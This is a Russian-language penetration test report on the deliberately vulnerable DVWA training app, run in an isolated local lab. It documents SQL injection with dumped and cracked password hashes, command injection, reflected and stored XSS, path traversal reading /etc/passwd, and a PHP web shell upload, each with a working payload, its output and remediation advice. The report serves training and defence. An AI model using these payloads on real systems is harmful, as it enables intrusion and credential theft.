# Отчёт: результаты тестирования на проникновение (учебная лаборатория DVWA)

**Объект:** DVWA v1.10 (Development) — локальный Docker-контейнер `vulnerables/web-dvwa`
**Адрес:** http://localhost:8080
**Уровень защиты тестируемого стенда:** security = low
**Дата:** 17.09.2026

> Все действия выполнены в изолированной лаборатории на собственном компьютере. Цель — отработка методики пентеста и подготовки отчётной документации.

---

## Уязвимость 1. SQL-инъекция (UNION-based) → компрометация учётных данных

**Модуль:** SQL Injection (`/vulnerabilities/sqli/`)
**Категория:** OWASP Top 10 — A03:2021 Injection

### Описание
Поле ввода **User ID** подставляется в SQL-запрос конкатенацией, без параметризации и фильтрации:

    SELECT first_name, last_name FROM users WHERE user_id = '$id'

Ввод пользователя интерпретируется как часть SQL-кода.

### Эксплуатация
Проверка (одиночная кавычка) и извлечение произвольных таблиц через UNION:

    id = 1' UNION SELECT user, password FROM users -- 

### Доказательство
Приложение вернуло все учётные записи и хэши паролей:

| user    | password (MD5)                    | расшифровано |
|---------|-----------------------------------|--------------|
| admin   | 5f4dcc3b5aa765d61d8327deb882cf99  | password     |
| smithy  | 5f4dcc3b5aa765d61d8327deb882cf99  | password     |
| gordonb | e99a18c428cb38d5f260853678922e03  | abc123       |
| 1337    | 8d3533d75ae2c3966d7e0d4fcc69216b  | charley      |
| pablo   | 0d107d09f5bbe40cade3de5c71e9e9b7  | letmein      |

Получен пароль администратора → полная компрометация данных.

### Оценка риска
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H ≈ **CVSS 9.8 (Critical)**

### Рекомендации
1. Параметризованные запросы (prepared statements / PDO).
2. Строгая валидация и типизация ввода (`id` → int).
3. Принцип наименьших привилегий для учётной записи БД приложения.
4. Хранение паролей: bcrypt/argon2 вместо MD5.

## Уязвимость 2. Command Injection → удалённое выполнение команд (RCE)

**Модуль:** Command Execution (`/vulnerabilities/exec/`)
**Категория:** OWASP Top 10 — A03:2021 Injection

### Описание
Поле **IP address** подставляется в команду `ping` без санитизации, что позволяет дописать собственные команды через разделитель `;`.

### Эксплуатация
    ip = 127.0.0.1; id && whoami && uname -a

### Доказательство
Выполнение подтверждено выводом команд:

    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    www-data
    Linux 2f69256caaf4 ... x86_64 GNU/Linux

Выполнение кода на сервере от имени веб-сервера `www-data`.

### Оценка риска
AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H ≈ **CVSS 9.8 (Critical)**

### Рекомендации
1. Не передавать пользовательский ввод в shell; использовать функции без вызова оболочки.
2. Белый список допустимых значений (валидация IP).
3. Изоляция веб-сервера, минимальные привилегии процесса, ограничение исходящих соединений.

## Уязвимость 3. Reflected XSS

**Модуль:** XSS (Reflected) (`/vulnerabilities/xss_r/`)

### Описание
Параметр `name` возвращается в HTML без экранирования — теги исполняются в браузере жертвы.

### Эксплуатация / Доказательство
    name = <script>alert('XSS-PWNED')</script>

В ответе тег присутствует в неизменном виде (`<script>` **не** закодирован как `&lt;script&gt;`) → срабатывает в браузере.

### Оценка риска
Кража cookies/сессии, выполнение действий от лица пользователя. **CVSS ≈ 6.1 (Medium)**

### Рекомендации
1. Контекстное HTML-экранирование вывода.
2. Заголовок `Content-Security-Policy` (CSP).
3. Флаги cookie `HttpOnly` и `Secure`.

## Уязвимость 4. Stored (хранимая) XSS

**Модуль:** XSS (Stored) (`/vulnerabilities/xss_s/`)
**Категория:** OWASP Top 10 — A03:2021 Injection

### Описание
Сообщение гостевой книги сохраняется в БД и выводится другим пользователям без экранирования.

### Эксплуатация / Доказательство
Отправлено сообщение: `<script>alert('STORED-XSS')</script>`. После повторной загрузки страницы payload присутствует в ответе в неизменном виде (без экранирования) → исполняется при каждом открытии страницы. Поражает всех посетителей.

### Оценка риска
Массовое поражение пользователей, захват сессий/кликджекинг. **CVSS ≈ 8.2 (High)**

### Рекомендации
1. Экранирование при выводе + валидация при сохранении.
2. CSP, HttpOnly/Secure cookies.
3. Санитизация HTML (библиотеки-фильтры).

## Уязвимость 5. Local File Inclusion (LFI) → чтение произвольных файлов

**Модуль:** File Inclusion (`/vulnerabilities/fi/`)
**Категория:** OWASP Top 10 — A03:2021 Injection (Path Traversal / LFI)

### Описание
Параметр `page` передаётся напрямую в `include()` без валидации пути, что позволяет выйти за пределы каталога приложения (path traversal).

### Эксплуатация
    page = ../../../../../../etc/passwd

### Доказательство
Приложение вернуло содержимое системного файла `/etc/passwd`:

    root:x:0:0:root:/root:/bin/bash
    daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
    ...

Чтение произвольных файлов сервера (при комбинации с загрузкой файлов — выполнение кода, LFI→RCE).

### Оценка риска
Раскрытие конфиденциальных данных, путь к RCE. **CVSS ≈ 7.5 (High)**

### Рекомендации
1. Не использовать пользовательский ввод в include; применять белый список допустимых страниц.
2. Отключить `allow_url_include`, задать `open_basedir`.
3. Хранить файлы конфигурации вне webroot.

## Уязвимость 6. Unrestricted File Upload → удалённое выполнение кода (RCE)

**Модуль:** File Upload (`/vulnerabilities/upload/`)
**Категория:** OWASP Top 10 — A05:2021 Security Misconfiguration / A03 Injection

### Описание
Модуль принимает файл любого типа и не проверяет его содержимое, а сохраняет в публично доступный каталог `/hackable/uploads/`. Загруженный `.php`-файл затем исполняется веб-сервером.

### Эксплуатация
Загружен веб-шелл `shell.php`:

    <?php echo "SHELL-OK"; system($_GET["cmd"]); ?>

Через веб-браузер:

    GET /hackable/uploads/shell.php?cmd=id

### Доказательство
Выполнение команд на сервере подтверждено:

    SHELL-OK
    uid=33(www-data) gid=33(www-data) groups=33(www-data)

Полноценный удалённый доступ к серверу (RCE).

### Оценка риска
AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H ≈ **CVSS 8.8 (High)** (полный контроль над сервером)

### Рекомендации
1. Проверять тип файла по содержимому (magic bytes), а не только по расширению/MIME.
2. Запрещать исполнение в каталоге загрузок (`.htaccess`, `php_admin_flag engine off`).
3. Хранить загрузки вне webroot, переименовывать файлы в случайные имена.
4. Ограничить права процесса веб-сервера и исходящие соединения.
